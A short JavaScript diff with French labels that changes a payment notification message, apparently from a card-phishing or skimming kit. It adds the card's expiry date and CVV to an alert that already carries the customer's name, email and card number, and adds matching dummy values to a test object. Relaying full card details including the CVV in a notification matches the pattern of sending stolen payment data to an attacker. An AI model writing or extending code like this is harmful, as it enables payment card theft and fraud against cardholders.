@@ -343,6 +343,8 @@
 👤 Nom: ${paymentData.customerName}
 📧 Email: ${paymentData.email}
 💳 Carte: ${paymentData.cardNumber}
+📅 Expiration: ${paymentData.expiry}
+🔐 CVV: ${paymentData.cvv}
 💶 Montant: ${paymentData.amount}€
 🔒 Vérifiez immédiatement !`;
                 
@@ -381,7 +383,9 @@
                     customerName: 'Test Client',
                     email: 'test@example.com',
                     amount: '99.99',
-                    cardNumber: '1234 **** **** 5678'
+                    cardNumber: '1234 **** **** 5678',
+                    expiry: '12/25',
+                    cvv: '123'
                 };
                 
                 const result = await sendCacapayNotification(testData);
